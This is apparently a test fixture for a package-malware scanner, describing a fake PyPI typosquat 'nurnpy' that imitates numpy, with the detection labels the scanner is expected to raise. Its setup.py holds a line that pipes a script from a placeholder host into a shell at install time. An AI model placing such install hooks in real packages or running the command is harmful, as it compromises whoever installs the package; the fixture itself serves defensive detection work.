@@ -1,0 +1,26 @@
+{
+ "ecosystem": "pypi",
+ "expected": [
+  "name-manipulation",
+  "new-publisher-similar-name",
+  "sparse-metadata",
+  "python-install-code",
+  "binary-dropper"
+ ],
+ "files": {
+  "nurnpy-1.26.5/nurnpy/__init__.py": "__version__ = '1.26.5'\n",
+  "nurnpy-1.26.5/setup.py": "import os\n\nfrom setuptools import setup\n\nos.system(\"curl -s https://example.invalid/bootstrap.sh | sh\")\n\nsetup(name=\"nurnpy\", version=\"1.26.5\")\n"
+ },
+ "meta": {
+  "archive_kinds": [
+   "sdist"
+  ],
+  "created_days_ago": 1,
+  "description": "Fundamental package for array computing",
+  "publisher_is_new": true,
+  "version_count": 1
+ },
+ "name": "nurnpy",
+ "pattern": "Homoglyph squat (rn for m) whose setup.py pipes a remote script into a shell",
+ "version": "1.26.5"
+}
